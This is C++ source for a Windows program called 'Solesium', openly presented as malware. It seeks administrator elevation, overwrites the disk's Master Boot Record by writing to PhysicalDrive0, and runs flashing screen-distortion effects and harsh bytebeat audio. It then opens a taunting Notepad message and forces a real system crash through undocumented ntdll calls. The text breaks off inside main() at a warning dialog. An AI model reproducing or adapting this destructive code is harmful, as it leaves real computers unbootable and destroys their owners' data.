// ============================================================
//  solesium.exe  --  "Solesium"
//  32-bit, Windows 2000 -> Windows 11.  Needs solesium.bin (512 b) on Desktop.
// ============================================================
#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif
#ifndef WINVER
#define WINVER 0x0500
#endif

#include <windows.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <shlobj.h>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <vector>
#include <algorithm>

#ifdef _MSC_VER
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(linker, "/MANIFESTUAC:level='requireAdministrator'")
#endif

// ---------------- rng ----------------
static uint32_t g_rs = 0x9E3779B9u;
static inline uint32_t xr() { g_rs ^= g_rs << 13; g_rs ^= g_rs >> 17; g_rs ^= g_rs << 5; return g_rs; }
static inline int      ri(int n) { return n <= 0 ? 0 : (int)(xr() % (uint32_t)n); }
static inline double   rf() { return (double)(xr() & 0xFFFFFF) / 16777216.0; }

enum { SR_MAX = 48000, NBUF = 4, BUFSZ = 2048 };

static volatile LONG g_stop = 0;
static volatile LONG g_phase = 0;
static volatile LONG g_rate = 8000;
static volatile LONG g_ps = 0;          // samples inside the current phase

// ============================================================
//  BYTEBEATS  (one per phase)
// ============================================================
static inline int32_t b0(uint32_t t) { return (int32_t)lround(128.0 + 80.0 * sin(t / 3000.0)); }

static inline int32_t b1(uint32_t t) {
    double s = sin(t / (8.0 + ((t >> 13 & 3) * 3)) + sin(t / 31.0) * 4 + sin(t / 97.0) * 2);
    return ((int32_t)lround(127.0 + 127.0 * s) * (int32_t)((t >> 5 & 7) + 1)) & 255;
}

static int32_t b2(uint32_t t) {
    static const char* S =
        "88FFDDFFAABFDBAA88FFDDFFAABFDD8888FFDDFFAABFDFIK88FFDDFFAABFDBAA";
    double tt = (double)t * pow(2.0, (double)((((t >> 18) | 1) - 1)) / 12.0);
    double T  = fmod(tt, 524288.0);
    int    Ti = (int)T;
    int    bit = (Ti >> 18) & 1;
    char   ch  = S[(Ti >> 12) & 63];
    int    dg  = (ch >= '0' && ch <= '9') ? ch - '0' : ch - 'A' + 10;

    auto A = [&](double b) { return fmod(T * pow(2.0, (dg + b + bit - 36) / 12.0), 256.0); };
    auto C = [&](double d) { return A(d) / 24.0 + A(-5 + d) / 24.0 + A(24 + d) / 24.0
                                  + A(48 + d) / 36.0 + A(60 + d) / 32.0; };
    auto E = [&](double f) { return C(f) + C(-12 + f); };

    double v = (E(0) + E(-12) + E(0.1) + E(-11.9)
              + fmod(T * pow(2.0, (-8 + bit) / 12.0), 256.0) / 5.0
              + fmod(T * pow(2.0, (-5 + bit) / 12.0), 256.0) / 5.0
              + fmod(T * pow(2.0, (-24 + bit) / 12.0), 256.0) / 16.0) * 4.0 - 800.0;
    if (v > 255.0) v = 255.0;
    if (v < 0.0)   v = 0.0;
    return (int32_t)v;
}

static inline int32_t b3(uint32_t t) {
    int32_t a = (int32_t)(t * (uint32_t)(((t >> 12) ^ ((t >> 9) & 7)) + 1)) & 255;
    return (a * (int32_t)((t >> 5 & 7) + 1)) & 255;
}

static inline int32_t b4(uint32_t t) {
    double den = 8.0 + (((t % 4410) < 441) ? 24.0 : 0.0);
    double s = sin(t / den + sin(t / 31.0) * 4 + sin(t / 97.0) * 2);
    return ((int32_t)lround(127.0 + 127.0 * s) * (int32_t)((t >> 5 & 7) + 1)) & 255;
}

static inline int32_t b5(uint32_t t) {
    double s = sin(t / 13.0 + sin(t / 37.0) * 2 + sin(t / 71.0) * 3);
    return ((int32_t)lround(127.0 + 127.0 * s) * (int32_t)((t >> 7 & 3) + 1)) & 255;
}

static inline int32_t b6(uint32_t t) {
    double s = sin(t / (3.0 + ((t >> 7 & 3) * 2))) * exp(-(double)(t % 256) / 55.0);
    return ((int32_t)lround(127.0 + 127.0 * s) * (int32_t)((t >> 5 & 3) + 1)) & 255;
}

static inline int32_t b9(uint32_t t) {
    double x = (t < 8000) ? (double)t
             : (t < 16000) ? 8000.0 + (t - 8000) / 4.0
             : (t < 24000) ? 10000.0 + (t - 16000)
             : 18000.0 + (t - 24000) / 4.0;
    double s = sin(x / 13.0 + sin(t / 37.0) * 2 + sin(t / 71.0) * 3);
    return ((int32_t)lround(127.0 + 127.0 * s) * (int32_t)((t >> 5 & 3) + 1)) & 255;
}

static inline int32_t b10(uint32_t t) {
    uint32_t a = t * ((((t >> 9) | (t >> 13)) & 25) & (t >> 6));
    uint32_t b = t * (((t >> 11) & (t >> 7)) | ((t >> 5) & 13));
    return (int32_t)(((a ^ b) | ((t >> 3) ^ ((t * 7) >> 5))) & 255);
}

struct PhaseInfo { uint32_t dur; int rate; int32_t (*fn)(uint32_t); };

static const PhaseInfo PH[] = {
    { 50000,  8000, b0  },   // 0  dither/blur/squares
    { 50000, 48000, b1  },   // 1  purple
    { 10000, 32000, b2  },   // 2  clipped random shapes
    { 50000,  8000, b3  },   // 3  circles + sines
    { 50000, 44100, b4  },   // 4  sines + ball
    { 50000,  8000, b5  },   // 5  vertical highlight stretch + ball
    { 50000, 32000, b6  },   // 6  sinewave + ball
    { 10000,  8000, b6  },   // 7  edge duplication
    { 10000,  8000, b6  },   // 8  invert + distorted spot
    { 50000, 32000, b9  },   // 9  bounce + rainbow + shake
    { 50000,  8000, b10 },   // 10 zoom spots + hue
    { 10000,  8000, b10 }    // 11 notepad
};
static const int PH_COUNT = sizeof(PH) / sizeof(PH[0]);

// ============================================================
//  AUDIO
// ============================================================
static HWAVEOUT g_wo = NULL;
static HANDLE   g_ev = NULL;
struct Buf { WAVEHDR h; uint8_t d[BUFSZ]; };
static Buf g_bufs[NBUF];

static void CALLBACK waveProc(HWAVEOUT, UINT m, DWORD_PTR, DWORD_PTR, DWORD_PTR) {
    if (m == WOM_DONE) SetEvent(g_ev);
}

static bool openDevice(int rate) {
    WAVEFORMATEX wf;
    memset(&wf, 0, sizeof(wf));
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = 1;
    wf.nSamplesPerSec = rate;
    wf.wBitsPerSample = 8;
    wf.nBlockAlign = 1;
    wf.nAvgBytesPerSec = rate;
    if (waveOutOpen(&g_wo, WAVE_MAPPER, &wf, (DWORD_PTR)waveProc, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        g_wo = NULL;
        return false;
    }
    for (int i = 0; i < NBUF; i++) {
        memset(g_bufs[i].d, 128, BUFSZ);
        g_bufs[i].h.lpData = (LPSTR)g_bufs[i].d;
        g_bufs[i].h.dwBufferLength = BUFSZ;
        g_bufs[i].h.dwFlags = 0;
        waveOutPrepareHeader(g_wo, &g_bufs[i].h, sizeof(WAVEHDR));
        waveOutWrite(g_wo, &g_bufs[i].h, sizeof(WAVEHDR));
    }
    return true;
}

static void closeDevice() {
    if (!g_wo) return;
    waveOutReset(g_wo);
    for (int i = 0; i < NBUF; i++) waveOutUnprepareHeader(g_wo, &g_bufs[i].h, sizeof(WAVEHDR));
    waveOutClose(g_wo);
    g_wo = NULL;
}

static void fillBuffer(uint8_t* out, int n) {
    int ph = (int)g_phase;
    if (ph >= PH_COUNT) ph = PH_COUNT - 1;
    int32_t (*fn)(uint32_t) = PH[ph].fn;
    for (int i = 0; i < n; i++) {
        uint32_t t = (uint32_t)g_ps;
        g_ps = (LONG)(t + 1);
        out[i] = (uint8_t)(fn(t) & 255);
    }
}

static DWORD WINAPI audioThread(LPVOID) {
    int cur = 0;
    while (!g_stop) {
        int want = (int)g_rate;
        if (want != cur) {
            closeDevice();
            if (!openDevice(want)) { Sleep(50); continue; }
            cur = want;
        }
        if (WaitForSingleObject(g_ev, 20) == WAIT_TIMEOUT) continue;
        for (int i = 0; i < NBUF; i++) {
            if (g_bufs[i].h.dwFlags & WHDR_DONE) {
                fillBuffer(g_bufs[i].d, BUFSZ);
                g_bufs[i].h.dwFlags &= ~WHDR_DONE;
                waveOutWrite(g_wo, &g_bufs[i].h, sizeof(WAVEHDR));
            }
        }
    }
    closeDevice();
    return 0;
}

// ============================================================
//  MBR
// ============================================================
static bool writeMBR() {
    char path[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) return false;
    lstrcatA(path, "\\solesium.bin");
    HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    uint8_t sec[512];
    memset(sec, 0, 512);
    DWORD rd = 0;
    BOOL ok = ReadFile(f, sec, 512, &rd, NULL);
    CloseHandle(f);
    if (!ok || rd == 0) return false;
    HANDLE d = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE | GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (d == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    SetFilePointer(d, 0, NULL, FILE_BEGIN);
    ok = WriteFile(d, sec, 512, &wr, NULL);
    FlushFileBuffers(d);
    CloseHandle(d);
    return ok && wr == 512;
}

// ============================================================
//  SURFACES
// ============================================================
enum { W = 800, H = 600, NPIX = W * H };
static HDC     g_memDC = NULL;
static HBITMAP g_dib = NULL;
static void*   g_bits = NULL;
static std::vector<uint32_t> g_tmp, g_snap;
static uint32_t g_tex[256 * 256];

static inline uint32_t SAMP(int x, int y) {
    if (x < 0) x = 0; else if (x >= W) x = W - 1;
    if (y < 0) y = 0; else if (y >= H) y = H - 1;
    return g_tmp[(size_t)y * W + x];
}
static inline uint32_t lum(uint32_t p) {
    return (((p >> 16) & 255) * 77 + ((p >> 8) & 255) * 151 + (p & 255) * 28) >> 8;
}
static inline uint32_t cl(int v) { return (uint32_t)(v < 0 ? 0 : v > 255 ? 255 : v); }
static inline uint32_t pack3(int r, int g, int b) {
    return 0xFF000000u | (cl(r) << 16) | (cl(g) << 8) | cl(b);
}
static inline uint32_t hsl(double h, double s, double l) {
    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double hp = fmod(h, 360.0) / 60.0;
    double x = c * (1.0 - fabs(fmod(hp, 2.0) - 1.0));
    double r = 0, g = 0, b = 0;
    if (hp < 1)      { r = c; g = x; }
    else if (hp < 2) { r = x; g = c; }
    else if (hp < 3) { g = c; b = x; }
    else if (hp < 4) { g = x; b = c; }
    else if (hp < 5) { r = x; b = c; }
    else             { r = c; b = x; }
    double m = l - c / 2.0;
    return pack3((int)((r + m) * 255), (int)((g + m) * 255), (int)((b + m) * 255));
}

static void grabScreen() {
    HDC dc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    StretchBlt(g_memDC, 0, 0, W, H, dc, 0, 0, sw, sh, SRCCOPY);
    ReleaseDC(NULL, dc);
}

static void blitScreen() {
    HDC dc = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    StretchBlt(dc, 0, 0, sw, sh, g_memDC, 0, 0, W, H, SRCCOPY);
    ReleaseDC(NULL, dc);
}

// ============================================================
//  PIXEL EFFECTS
// ============================================================
static void fxDither() {
    static const int bayer[16] = { 0,8,2,10,12,4,14,6,3,11,1,9,15,7,13,5 };
    uint32_t* d = (uint32_t*)g_bits;
    for (int y = 0; y < H; y++) for (int x = 0; x < W; x++) {
        int t = bayer[(y & 3) * 4 + (x & 3)] * 5;
        uint32_t p = d[y * W + x];
        d[y * W + x] = pack3((int)(p >> 16 & 255) + t - 40,
                             (int)(p >> 8 & 255) + t - 40,
                             (int)(p & 255) + t - 40);
    }
}

static void fxPosterize(int lv) {
    uint32_t* d = (uint32_t*)g_bits;
    int step = 256 / lv;
    for (int i = 0; i < NPIX; i++) {
        uint32_t p = d[i];
        d[i] = pack3((int)(((p >> 16 & 255) / step) * step),
                     (int)(((p >> 8 & 255) / step) * step),
                     (int)(((p & 255) / step) * step));
    }
}

static void fxBlur() {
    uint32_t* d = (uint32_t*)g_bits;
    g_tmp.assign(d, d + NPIX);
    for (int y = 0; y < H; y++) for (int x = 0; x < W; x++) {
        int r = 0, g = 0, b = 0;
        for (int dy = -1; dy <= 1; dy++) for (int dx = -1; dx <= 1; dx++) {
            uint32_t p = SAMP(x + dx, y + dy);
            r += p >> 16 & 255; g += p >> 8 & 255; b += p & 255;
        }
        d[y * W + x] = pack3(r / 9, g / 9, b / 9);
    }
}

static void fxHDisp(int amp) {
    uint32_t* d = (uint32_t*)g_bits;
    g_tmp.assign(d, d + NPIX);
    double ph = rf() * 6.28;
    for (int y = 0; y < H; y++) {
        int off = (int)(sin(y * 0.02 + ph) * amp);
        for (int x = 0; x < W; x++) d[y * W + x] = SAMP(x + off, y);
    }
}

static void fxPixDisp() {
    uint32_t* d = (uint32_t*)g_bits;
    g_tmp.assign(d, d + NPIX);
    int bs = 10 + ri(60);
    for (int y = 0; y < H; y++) for (int x = 0; x < W; x++) {
        uint32_t k = ((uint32_t)(x / bs) * 73856093u) ^ ((uint32_t)(y / bs) * 19349663u) ^ xr();
        d[y * W + x] = SAMP(x + (int)(k % 41) - 20, y + (int)((k >> 8) % 41) - 20);
    }
}

static void fxSineWave(int amp) {
    uint32_t* d = (uint32_t*)g_bits;
    g_tmp.assign(d, d + NPIX);
    double ph = rf() * 6.28;
    for (int y = 0; y < H; y++) {
        int off = (int)(sin(y * 0.05 + ph) * amp);
        for (int x = 0; x < W; x++) d[y * W + x] = SAMP(x + off, y);
    }
}

static void fxHue(double shift) {
    uint32_t* d = (uint32_t*)g_bits;
    for (int i = 0; i < NPIX; i++) {
        uint32_t p = d[i];
        int r = (int)(p >> 16 & 255), g = (int)(p >> 8 & 255), b = (int)(p & 255);
        int mx = r > g ? (r > b ? r : b) : (g > b ? g : b);
        int mn = r < g ? (r < b ? r : b) : (g < b ? g : b);
        double hh = 0;
        if (mx != mn) {
            double dd = mx - mn;
            if (mx == r)      hh = fmod((g - b) / dd, 6.0);
            else if (mx == g) hh = (b - r) / dd + 2.0;
            else              hh = (r - g) / dd + 4.0;
            hh *= 60.0;
        }
        d[i] = hsl(hh + shift, mx == 0 ? 0 : (double)(mx - mn) / mx, mx / 255.0);
    }
}

// ============================================================
//  GDI HELPERS
// ============================================================
static void alphaRect(HDC dc, int x, int y, int w, int h, uint32_t rgb, int a) {
    if (w <= 0 || h <= 0) return;
    HDC m = CreateCompatibleDC(dc);
    HBITMAP bm = CreateCompatibleBitmap(dc, w, h);
    HGDIOBJ ob = SelectObject(m, bm);
    RECT r = { 0, 0, w, h };
    HBRUSH br = CreateSolidBrush(RGB(rgb >> 16 & 255, rgb >> 8 & 255, rgb & 255));
    FillRect(m, &r, br);
    DeleteObject(br);
    BLENDFUNCTION bf = { AC_SRC_OVER, 0, (BYTE)a, 0 };
    AlphaBlend(dc, x, y, w, h, m, 0, 0, w, h, bf);
    SelectObject(m, ob);
    DeleteObject(bm);
    DeleteDC(m);
}

static void ciShape(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN r = NULL;
    switch (ri(4)) {
    case 0: r = CreateEllipticRgn(x, y, x + w, y + h); break;
    case 1: r = CreateRectRgn(x, y, x + w, y + h); break;
    case 2: r = CreateRoundRectRgn(x, y, x + w, y + h, 70, 70); break;
    default: {
        POINT p[3] = { { x + w / 2, y }, { x, y + h }, { x + w, y + h } };
        r = CreatePolygonRgn(p, 3, WINDING);
    } break;
    }
    if (r) {
        SelectClipRgn(hdc, r);
        BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
        SelectClipRgn(hdc, NULL);
        DeleteObject(r);
    }
    ReleaseDC(0, hdc);
}

static void ciCircle(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN r = CreateEllipticRgn(x, y, x + w, y + h);
    SelectClipRgn(hdc, r);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    SelectClipRgn(hdc, NULL);
    DeleteObject(r);
    ReleaseDC(0, hdc);
}

static void sinesPass() {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    for (float i = 0; i < sw + sh; i += 0.99f) {
        int a = (int)(sin(angle) * 20);
        BitBlt(desk, 0, (int)i, sw, 1, desk, a, (int)i, SRCCOPY);
        angle += 3.14159265 / 40.0;
    }
    ReleaseDC(GetDesktopWindow(), desk);
}

// ============================================================
//  3D RAINBOW BALL
// ============================================================
struct BP { double x, y, z; };
static BP g_bp[220];

static void initBall() {
    for (int i = 0; i < 220; i++) {
        double off = 2.0 / 220.0;
        double yv = i * off - 1.0 + off / 2.0;
        double rr = sqrt(1.0 - yv * yv);
        double ph = i * 2.399963;
        g_bp[i].x = cos(ph) * rr;
        g_bp[i].y = yv;
        g_bp[i].z = sin(ph) * rr;
    }
}

static void drawBall(HDC dc, double bx, double by, double ax, double ay, double rad) {
    double ca = cos(ax), sa = sin(ax), cb = cos(ay), sb = sin(ay);
    for (int i = 0; i < 220; i++) {
        double x = g_bp[i].x, y = g_bp[i].y, z = g_bp[i].z;
        double x1 = x * cb + z * sb, z1 = -x * sb + z * cb;
        double y1 = y * ca - z1 * sa, z2 = y * sa + z1 * ca;
        double persp = 2.4 / (2.4 + z2);
        int sx = (int)(bx + x1 * rad * persp);
        int sy = (int)(by + y1 * rad * persp);
        int rr = (int)(rad * 0.13 * persp);
        uint32_t col = hsl(i * 1.63 + g_ps * 0.02, 0.95, 0.55);
        HBRUSH br = CreateSolidBrush(RGB(col >> 16 & 255, col >> 8 & 255, col & 255));
        HBRUSH ob = (HBRUSH)SelectObject(dc, br);
        HPEN op = (HPEN)SelectObject(dc, GetStockObject(NULL_PEN));
        Ellipse(dc, sx - rr, sy - rr, sx + rr, sy + rr);
        SelectObject(dc, ob);
        SelectObject(dc, op);
        DeleteObject(br);
    }
}

// ============================================================
//  NOTEPAD
// ============================================================
static void openNotepad() {
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) return;
    lstrcatA(tmp, "solesium.txt");
    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        const char* txt = "too lazy to make other payloads :p\r\nlast thing u see!";
        DWORD wr = 0;
        WriteFile(f, txt, (DWORD)lstrlenA(txt), &wr, NULL);
        CloseHandle(f);
    }
    ShellExecuteA(NULL, "open", "notepad.exe", tmp, NULL, SW_SHOWNORMAL);
}

// ============================================================
//  REAL BSOD
// ============================================================
static void realBsod() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        typedef LONG (WINAPI *PFN_ADJ)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
        typedef LONG (WINAPI *PFN_RAISE)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        PFN_ADJ adj = (PFN_ADJ)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        PFN_RAISE raise = (PFN_RAISE)GetProcAddress(ntdll, "NtRaiseHardError");
        if (adj && raise) {
            BOOLEAN was = 0;
            adj(19, TRUE, FALSE, &was);
            ULONG resp = 0;
            raise(0xC0000005L, 0, 0, NULL, 6, &resp);
            Sleep(10000);
        }
    }
}

// ============================================================
//  VISUAL PHASES
// ============================================================
static void visP0(HDC sdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    grabScreen();
    fxDither();
    if (ri(2)) fxBlur();
    fxPosterize(2 + ri(3));
    if (ri(3) == 0) fxHDisp(10 + ri(40));
    if (ri(3) == 0) fxPixDisp();
    blitScreen();
    for (int i = 0; i < 6; i++)
        alphaRect(sdc, ri(sw), ri(sh), 40 + ri(300), 40 + ri(300), xr() & 0xFFFFFF, 60 + ri(90));
    if (ri(2)) alphaRect(sdc, 0, 0, sw, sh, 0xFFFFFF, 25 + ri(50));
    else       alphaRect(sdc, 0, 0, sw, sh, 0x000000, 25 + ri(50));
}

static void visP1() {
    uint32_t* d = (uint32_t*)g_bits;
    uint32_t base = hsl(275.0 + rf() * 30.0, 0.75, 0.35);
    for (int i = 0; i < NPIX; i++) d[i] = base;
    fxSineWave(12 + ri(30));
    blitScreen();
}

static void visP2(HDC sdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int size = 1000;
    int x = ri(sw + size) - size / 2, y = ri(sh + size) - size / 2;
    for (int i = 0; i < size; i += 100) {
        ciShape(x - i / 2, y - i / 2, i, i);
        Sleep(25);
    }
}

static void visP3(HDC sdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int size = 1000;
    int x = ri(sw + size) - size / 2, y = ri(sh + size) - size / 2;
    for (int i = 0; i < size; i += 100) {
        ciCircle(x - i / 2, y - i / 2, i, i);
        Sleep(25);
    }
    sinesPass();
}

static void visP4(HDC sdc, double bx, double by, double ax, double ay) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    grabScreen();
    blitScreen();
    drawBall(sdc, bx, by, ax, ay, sh * 0.28);
    sinesPass();
}

static void visP5(HDC sdc, double bx, double by, double ax, double ay) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    for (int k = 0; k < 5; k++) {
        int y = ri(sh), hh = 3 + ri(40);
        StretchBlt(sdc, 0, y, sw, hh * (2 + ri(5)), sdc, 0, y, sw, hh, SRCCOPY);
    }
    drawBall(sdc, bx, by, ax, ay, sh * 0.26);
}

static void visP6(HDC sdc, double bx, double by, double ax, double ay) {
    grabScreen();
    fxSineWave(30 + ri(90));
    blitScreen();
    int sh = GetSystemMetrics(SM_CYSCREEN);
    drawBall(sdc, bx, by, ax, ay, sh * 0.24);
}

static void visP7(HDC sdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    for (int k = 1; k <= 6; k++) {
        int o = k * 22;
        BitBlt(sdc, -o, -o, sw, sh / 3, sdc, 0, 0, SRCCOPY);
        BitBlt(sdc, o, -o, sw, sh / 3, sdc, 0, sh - sh / 3, SRCCOPY);
        BitBlt(sdc, -o, o, sw / 3, sh, sdc, 0, 0, SRCCOPY);
        BitBlt(sdc, -o, o, sw / 3, sh, sdc, sw - sw / 3, 0, SRCCOPY);
    }
    if (ri(4) == 0) {
        RECT r = { 0, 0, sw, sh };
        HBRUSH b = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(sdc, &r, b);
        DeleteObject(b);
    }
}

static void visP8(HDC sdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    PatBlt(sdc, 0, 0, sw, sh, PATINVERT);
    int r = 100 + ri(260);
    int cx = ri(sw), cy = ri(sh);
    HDC m = CreateCompatibleDC(sdc);
    HBITMAP bm = CreateCompatibleBitmap(sdc, r * 2, r * 2);
    HGDIOBJ ob = SelectObject(m, bm);
    StretchBlt(m, 0, 0, r * 2, r * 2, sdc, cx - r, cy - r, r * 2, r * 2, SRCCOPY);
    HRGN hr = CreateEllipticRgn(cx - r, cy - r, cx + r, cy + r);
    SelectClipRgn(sdc, hr);
    StretchBlt(sdc, cx - r, cy - r, r * 2, r * 2, m, 0, 0, r * 2, r * 2, SRCCOPY);
    SelectClipRgn(sdc, NULL);
    DeleteObject(hr);
    SelectObject(m, ob);
    DeleteObject(bm);
    DeleteDC(m);
}

static void visP9(HDC sdc, double bx, double by, double ax, double ay, int ox, int oy) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    grabScreen();
    fxHue(g_ps * 0.35);
    blitScreen();
    int r = 120 + ri(220);
    int cx = ri(sw), cy = ri(sh);
    HRGN hr = CreateEllipticRgn(cx - r, cy - r, cx + r, cy + (int)(r * 1.9));
    SelectClipRgn(sdc, hr);
    BitBlt(sdc, ox, oy, sw, sh, sdc, 0, 0, NOTSRCCOPY);
    SelectClipRgn(sdc, NULL);
    DeleteObject(hr);
    drawBall(sdc, bx, by, ax, ay, sh * 0.22);
    BitBlt(sdc, ri(9) - 4, ri(9) - 4, sw, sh, sdc, 0, 0, SRCCOPY);
}

static void visP10(HDC sdc, HDC mdc) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    for (int k = 0; k < 4; k++) {
        int x = ri(sw), y = ri(sh), w = 20 + ri(90), h = 20 + ri(90);
        int zoom = 3 + ri(9);
        StretchBlt(sdc, x - w * zoom / 2, y - h * zoom / 2, w * zoom, h * zoom,
                   sdc, x, y, w, h, SRCCOPY);
    }
    grabScreen();
    fxHue(g_ps * 1.6);
    blitScreen();
    for (int k = 0; k < 5; k++) {
        int x = ri(sw), y = ri(sh), w = 60 + ri(200), h = 60 + ri(200);
        HBRUSH b = CreateSolidBrush(RGB(g_snap[(size_t)(y * H / sh) * W + (x * W / sw)] >> 16 & 255,
                                        g_snap[(size_t)(y * H / sh) * W + (x * W / sw)] >> 8 & 255,
                                        g_snap[(size_t)(y * H / sh) * W + (x * W / sw)] & 255));
        RECT r = { x, y, x + w, y + h };
        FillRect(sdc, &r, b);
        DeleteObject(b);
    }
    double ang = sin(g_ps * 0.004) * 0.06;
    double ca = cos(ang), sa = sin(ang);
    double cx = sw / 2.0, cy = sh / 2.0;
    POINT p[3];
    double xs[3] = { 0, (double)sw, 0 }, ys[3] = { 0, 0, (double)sh };
    for (int i = 0; i < 3; i++) {
        double rx = xs[i] - cx, ry = ys[i] - cy;
        p[i].x = (LONG)(cx + rx * ca - ry * sa);
        p[i].y = (LONG)(cy + rx * sa + ry * ca);
    }
    PlgBlt(sdc, p, mdc, 0, 0, W, H, NULL, 0, 0);
}

// ============================================================
//  VISUAL THREAD
// ============================================================
static DWORD WINAPI visualThread(LPVOID) {
    DWORD t0 = GetTickCount();
    DWORD phStart = t0;
    int   ph = -1;
    double bx = 400, by = 300, vx = 6.0, vy = 4.5, ax = 0, ay = 0;
    int ox = 0, oy = 0, bounceIdx = 0;
    bool notepadDone = false;

    while (!g_stop) {
        DWORD now = GetTickCount();
        DWORD el = now - t0;

        // phase advance
        int want = 0;
        DWORD acc = 4000;                    // "some seconds later"
        for (int i = 0; i < PH_COUNT; i++) {
            if (el < acc + PH[i].dur) { want = i; break; }
            acc += PH[i].dur;
            want = i + 1;
        }
        if (want >= PH_COUNT) break;
        if (want != ph) {
            ph = want;
            phStart = now;
            InterlockedExchange(&g_phase, ph);
            InterlockedExchange(&g_rate, PH[ph].rate);
            InterlockedExchange(&g_ps, 0);
        }
        DWORD pel = now - phStart;

        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        HDC sdc = GetDC(NULL);

        // ball motion (DVD style)
        bx += vx; by += vy;
        if (bx < 90 || bx > sw - 90) { vx = -vx; bx += vx * 2; }
        if (by < 90 || by > sh - 90) { vy = -vy; by += vy * 2; }
        ax += 0.09; ay += 0.061;

        switch (ph) {
        case 0: visP0(sdc); break;
        case 1: visP1(); break;
        case 2: visP2(sdc); break;
        case 3: visP3(sdc); break;
        case 4: visP4(sdc, bx, by, ax, ay); break;
        case 5: visP5(sdc, bx, by, ax, ay); break;
        case 6: visP6(sdc, bx, by, ax, ay); break;
        case 7: visP7(sdc); break;
        case 8: visP8(sdc); break;
        case 9: {
            static const int dirs[4][2] = { { -1, -1 }, { 1, -1 }, { 1, 1 }, { -1, 1 } };
            if ((pel / 220) != (DWORD)bounceIdx) {
                bounceIdx = (int)(pel / 220);
                ox = dirs[bounceIdx & 3][0] * (6 + ri(30));
                oy = dirs[bounceIdx & 3][1] * (6 + ri(30));
            }
            visP9(sdc, bx, by, ax, ay, ox, oy);
        } break;
        case 10: visP10(sdc, g_memDC); break;
        case 11:
            grabScreen();
            blitScreen();
            if (!notepadDone) { notepadDone = true; openNotepad(); }
            break;
        }

        if (ph == 11 && pel > PH[11].dur - 2500) {
            Sleep(120);
            ReleaseDC(NULL, sdc);
            break;
        }

        ReleaseDC(NULL, sdc);
        Sleep(ph == 2 || ph == 3 ? 6 : 16);
    }

    InterlockedExchange(&g_stop, 1);
    Sleep(400);
    realBsod();
    return 0;
}

// ============================================================
//  ELEVATION
// ============================================================
static bool isAdmin() {
    BOOL ok = FALSE;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID admins = NULL;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admins)) {
        CheckTokenMembership(NULL, admins, &ok);
        FreeSid(admins);
    }
    return ok != FALSE;
}

// ============================================================
//  MAIN
// ============================================================
int main() {
    HMODULE u32 = GetModuleHandleA("user32.dll");
    if (u32) {
        typedef BOOL (WINAPI *PFN)(void);
        PFN p = (PFN)GetProcAddress(u32, "SetProcessDPIAware");
        if (p) p();
    }

    if (!isAdmin() && !strstr(GetCommandLineA(), "/elevated")) {
        char exe[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, exe, MAX_PATH);
        SHELLEXECUTEINFOA sei;
        memset(&sei, 0, sizeof(sei));
        sei.cbSize = sizeof(sei);
        sei.lpVerb = "runas";
        sei.lpFile = exe;
        sei.lpParameters = "/elevated";
        sei.nShow = SW_SHOWNORMAL;
        if (ShellExecuteExA(&sei)) return 0;
        MessageBoxA(NULL, "Could not elevate. The MBR write will probably fail.",
                    "solesium.exe by kroza", MB_OK | MB_ICONWARNING);
    }

    int a = MessageBoxA(NULL,
        "WARNING! You ran a malware named Solesium.\n"
        "This destroys the MBR and destroys all files, so you will have to reinstall Windows!\n"
        "Do you want to run this?",
        "solesium.exe by kroza",
